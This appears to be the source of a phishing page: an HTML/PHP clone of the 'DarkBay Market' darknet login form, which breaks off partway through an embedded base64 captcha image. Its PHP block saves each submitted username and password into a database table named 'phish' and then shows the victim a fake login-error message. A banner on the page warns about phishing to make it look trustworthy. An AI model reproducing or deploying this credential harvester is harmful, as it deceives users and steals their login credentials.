<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="app.css">
  <link rel="stylesheet" href="css/all.css">
   <link rel="stylesheet" href="css/fontawesome.css">
  




  <title>DarkBay</title>
  <link rel="shortcut icon" href="favicon.png">
  <style type="text/css">
    
  </style>
</head>
<body class="pb-4">
  <a class="" href="index.php"><img src="dbsmall.png"></a>
  <nav class="navbar navbar-expand-sm navbar-dark bg-mgray">
    <div class="container">
      <input type="checkbox" id="navbar-toggle-cbox"> <label class="navbar-toggler" for="navbar-toggle-cbox" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></label>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav flex-row"></ul>
        <ul class="navbar-nav"></ul><a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href="signup.php"><b>Register</b></a> <a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href=""><b>Forum</b></a> <a class="nav-item"></a><a class="nav-link text-nowrap glowreg" href=""><b>Verify Mirror</b></a>
      </div>
    </div>
  </nav>
  <div class="container">
    <div class="mt-3">
      <div id="jswarning"></div>
    </div>
    <script>
        let warningText = 'You have JavaScript enabled, you are putting yourself at risk! Please disable it immediately!'
        let jsWarning = document.getElementById('jswarning');
        let alert = document.createElement('div');
        let span = document.createElement('span');
        alert.classList.add('alert');
        alert.classList.add('alert-danger');
        span.innerText = warningText;
        alert.appendChild(span);
        jsWarning.appendChild(alert);
    </script>
    <div class="mt-4">
      <div class="row mt-5 justify-content-center">
        <div class="alert alert-danger">
          <strong>Due To Reports Of Phishing Please Only Get Links From <b>Dark.Fail</b></strong>
        </div>
        <div class="col-md-11">
          <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand"><i class="fas fa-sign-in-alt"></i> Login</a> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
          </nav>
        </div><br>
        <br>
        <br>
        <br>
        <div class="col-md-10">
          <br>
        </div>
        <div class="col-md-10">
          <div class="card">
            <div class="card-header bg-light">
              <font color="white"><i class="fas fa-sign-in-alt"></i> <b>Login To DarkBay Market</b></font>
            </div>
            <div class="card-body">
              <p style="font-size:12px">Welcome to DarkBay Market! Please login to access the marketplace. If you do not have an account, you can register to get access to the listings. Registrations are free and open to everyone. If you have lost your password, please use the forgot password form to reset your password.</p>
              <center>
                <div class="col-md-8">
                  <div class="mt-3">
                    <?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
include 'conn.php';

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
if(isset($_POST['save'])){
 $username = mysqli_real_escape_string($link,$_POST['username']);
 $password = mysqli_real_escape_string($link,$_POST['password']);
 $captcha = mysqli_real_escape_string($link,$_POST['captcha']);
 

 if (empty($username)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Username Cannot be Empty
    </div>";
}

elseif (empty($password)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Password Cannot be Empty
    </div>";
}
elseif (empty($captcha)) {
    echo "<div class='alert alert-danger'>
    <strong>Failed!</strong>Please Enter the correct captcha
    </div>";
}


else{ 

// Attempt insert query execution
    $sql = "INSERT INTO phish (username,
password
) 
    VALUES ('$username',
'$password')";
    if(mysqli_query($link, $sql)){
      echo ' <div class="alert alert-danger">
  <strong>Dark Market!</strong> There was an error during Login, Please try again later
</div>';
    } else{
                    echo "db insertion error:".$query."<br>";

                }//else end
}
}
// Close connection
mysqli_close($link);

?>
                    <form action='' method="post">
                      <input type="hidden" name="_token" value="3Eqm7FsxzkRojKCdwHUG2cnxigXAQbirDME6WIya">
                      <div class="form-group">
                        <input type="text" class="form-control" placeholder="Username" name="username" id="username">
                      </div>
                      <div class="form-group">
                        <input type="password" class="form-control" placeholder="Password" name="password" id="password">
                      </div>
                      <div class="form-group mt-3">
                        <div class="text-center"><img src="data:image/jpeg;base64,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